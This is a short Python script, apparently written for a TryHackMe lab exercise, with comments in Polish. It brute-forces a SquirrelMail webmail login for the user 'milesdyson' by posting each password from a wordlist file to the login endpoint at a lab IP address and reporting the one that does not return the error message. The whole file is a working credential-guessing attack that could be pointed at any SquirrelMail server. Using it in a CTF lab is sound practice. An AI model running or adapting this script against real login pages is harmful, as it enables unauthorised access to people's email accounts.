#  kod do zadania z THM, hasłą z pliku log1.txt, login: milesdyson, część kodu z konwertera curl to python https://curlconverter.com/ , instrukcja w https://www.youtube.com/watch?v=HXikLrFVIXc

from pprint import pprint
import requests

cookies = {
    'squirrelmail_language': 'en_US',
    'SQMSESSID': 'gvad69n22vh19g5r5i6nteehg4',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Origin': 'http://10.10.16.80',
    'Connection': 'keep-alive',
    'Referer': 'http://10.10.16.80/squirrelmail/src/login.php',
    # Requests sorts cookies= alphabetically
    # 'Cookie': 'squirrelmail_language=en_US; SQMSESSID=gvad69n22vh19g5r5i6nteehg4',
    'Upgrade-Insecure-Requests': '1',
}

username = 'milesdyson'
passwords = [x.strip() for x in open('log1.txt').read().split('\n') if x]

for password in passwords:
    data = {
        'login_username': username,
        'secretkey': password,
        'js_autodetect_results': '1',
        'just_logged_in': '1',
    }
    response = requests.post('http://10.10.16.80/squirrelmail/src/redirect.php', cookies=cookies, headers=headers,
                             data=data)
    if "Unknown user or password incorrect." not in response.text:
        print("Hasło: ")
        print(password)
    else:
        print("niewasciwe haslo")
        print(password)
